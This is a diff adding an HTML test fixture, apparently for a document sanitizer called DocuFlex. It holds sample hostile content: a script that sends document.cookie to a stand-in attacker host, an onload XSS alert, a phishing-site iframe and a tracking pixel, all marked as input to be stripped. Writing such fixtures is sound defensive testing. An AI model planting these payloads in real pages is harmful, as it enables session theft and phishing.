@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Security Test Document</title>
+  <script>
+    // Test malicious script: should be stripped completely
+    window.location = "https://malicious-telemetry.example/leak?token=" + document.cookie;
+  </script>
+</head>
+<body onload="alert('XSS Exploit')">
+  <h1>Project Security Protocol</h1>
+  <p>This is a confidential company briefing document.</p>
+  <p>Section 1: All documents must remain offline on the local hardware.</p>
+  <iframe src="https://phishing-site.example/login"></iframe>
+  <img src="https://tracking-pixel.example/pixel.gif" alt="Tracker" />
+  <p>DocuFlex neutralizes inline javascript, iframes, and remote network elements.</p>
+</body>
+</html>
